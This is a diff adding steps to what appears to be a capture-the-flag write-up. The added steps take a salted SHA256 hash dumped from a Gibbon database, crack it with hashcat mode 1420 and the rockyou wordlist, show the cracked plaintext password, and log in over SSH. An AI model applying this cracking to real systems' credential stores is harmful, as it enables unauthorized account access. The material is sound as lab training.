@@ -137,7 +137,13 @@ username	passwordStrong	passwordStrongSalt
 f.frizzle	067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03	/aACFhikmNopqrRTVz2489
 ```
 
-In Gibbon, the passwords are stored as SHA256 where salt is prepended.
+Put all the data in a `hash.txt` file in format `username:hash:salt` as that is the expected format. In Gibbon, the passwords are stored as SHA256 where salt is prepended so choose the mode accordingly.
+`hashcat -m 1420 --username hash.txt /usr/share/wordlists/rockyou.txt.gz`
+
+And we have the password cracked! `067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03:/aACFhikmNopqrRTVz2489:Jenni_Luvs_Magic23`
+
+Now we can simply `ssh` to the machine!
+
 
 
 
